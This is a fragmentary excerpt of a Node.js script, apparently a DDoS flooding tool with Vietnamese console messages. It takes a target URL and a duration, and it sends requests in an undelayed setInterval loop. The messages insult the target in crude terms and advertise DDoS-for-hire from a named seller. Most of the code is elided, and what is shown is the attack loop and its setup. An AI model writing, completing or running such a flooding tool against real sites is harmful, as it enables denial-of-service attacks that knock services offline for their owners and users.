...
Ví dụ : node ${path.basename(__filename)} https://hoviettucoder.fun 120 151`);
    process.exit(0);
}
...
let init = function () {
    getHeaders().then(function (result) {
        console.log('Đang Tấn Công Thằng Lồn! ');
        setInterval(() => {
            send_req(result);
        });
    });
...
setTimeout(() => {
    console.log('Tấn Công Xong Rùi, Mua DDoS Ib Hồ Viết Tú Nhớ Chưa Lỏ');
    process.exit(0)
}, time * 1000);
